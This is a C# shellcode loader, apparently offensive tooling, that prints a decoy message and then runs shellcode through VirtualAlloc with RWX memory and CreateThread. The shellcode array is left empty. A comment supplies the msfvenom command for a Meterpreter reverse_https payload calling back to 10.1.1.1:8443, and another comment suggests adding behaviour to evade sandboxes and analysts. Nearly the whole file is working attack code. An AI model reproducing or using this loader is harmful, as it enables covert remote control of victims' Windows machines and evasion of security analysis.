using System;
using System.Net;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.InteropServices;



public class Program
{
    public static void Main()
    {
        Console.WriteLine("Hello From Main...I Don't Do Anything");
        //Add any behaviour here to throw off sandbox execution/analysts :)
        Shellcode.Exec();
    }

}



public class Shellcode
{
    public static void Exec()
    {
        // native function's compiled code
        // generated with metasploit
        byte[] shellcode = new byte[]{
     //copy the shell code here.. msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.1.1.1 LPORT=8443 -f csharp
 };


    UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,
                        MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    Marshal.Copy(shellcode, 0, (IntPtr) (funcAddr), shellcode.Length);
				IntPtr hThread = IntPtr.Zero;
    UInt32 threadId = 0;
    // prepare data


    IntPtr pinfo = IntPtr.Zero;

    // execute native code

    hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);

                WaitForSingleObject(hThread, 0xFFFFFFFF);

}

private static UInt32 MEM_COMMIT = 0x1000;

private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

[DllImport("kernel32")]
private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
 UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

[DllImport("kernel32")]
private static extern bool VirtualFree(IntPtr lpAddress,
                      UInt32 dwSize, UInt32 dwFreeType);

[DllImport("kernel32")]
private static extern IntPtr CreateThread(

  UInt32 lpThreadAttributes,
  UInt32 dwStackSize,
  UInt32 lpStartAddress,
  IntPtr param,
  UInt32 dwCreationFlags,
  ref UInt32 lpThreadId

  );
[DllImport("kernel32")]
private static extern bool CloseHandle(IntPtr handle);

[DllImport("kernel32")]
private static extern UInt32 WaitForSingleObject(

  IntPtr hHandle,
  UInt32 dwMilliseconds
  );
[DllImport("kernel32")]
private static extern IntPtr GetModuleHandle(

  string moduleName

  );
[DllImport("kernel32")]
private static extern UInt32 GetProcAddress(

  IntPtr hModule,
  string procName

  );
[DllImport("kernel32")]
private static extern UInt32 LoadLibrary(

  string lpFileName

  );
[DllImport("kernel32")]
private static extern UInt32 GetLastError();
			
	 
		}
